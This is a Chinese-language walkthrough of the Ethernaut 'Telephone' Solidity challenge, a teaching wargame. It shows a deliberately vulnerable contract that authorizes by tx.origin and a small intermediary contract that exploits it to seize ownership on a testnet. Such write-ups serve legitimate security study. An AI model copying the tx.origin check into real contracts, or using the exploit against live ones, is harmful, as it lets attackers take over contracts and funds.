# level4 telephone

## 1. 问题

将`Telephone`合约的owner设置成自己的地址

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```


## 2. 解法

合约有`changeOwner`函数，只要这个函数的调用方（sender）和交易发起方 (origin)不一致即可。我们可以通过部署一个 bridge 合约，通过这个bridge合约间接调用`changeOwner`即可做到。

对于嵌套调用的场景，比如`EOA(A) -> CONTRACT(B) -> CONTRACT(C)`, 在合约C中的函数看来，tx.origin=A, tx.sender=B。origin指向的是__最初发起交易__的EOA地址，sender指的是__直接调用本合约的上一个地址__。

1. 我们写一个合约bridge：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract bridge {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }
    
    function send() external {
        // 设置owner为EOA地址
        telephone.changeOwner(msg.sender);
    }
} 
```

2. 复制到remix，部署到测试链：[0xf97be735216a1dddb144ff56dcf25b7de9f94af21c7e5f2ef987c7557d317f35](https://sepolia.etherscan.io/tx/0xf97be735216a1dddb144ff56dcf25b7de9f94af21c7e5f2ef987c7557d317f35)

3. remix里面调用send接口：[0x77174fef6cca1ed5feb39a0ee7ea1ee836f4eca9612c029806adbe61872c6b0a](https://sepolia.etherscan.io/tx/0x77174fef6cca1ed5feb39a0ee7ea1ee836f4eca9612c029806adbe61872c6b0a)

4. 在ethernaut控制台看一下owner，发现已经变了：
```bash
await contract.owner()
```

5. 点击 `submit instance`， 提交通过！
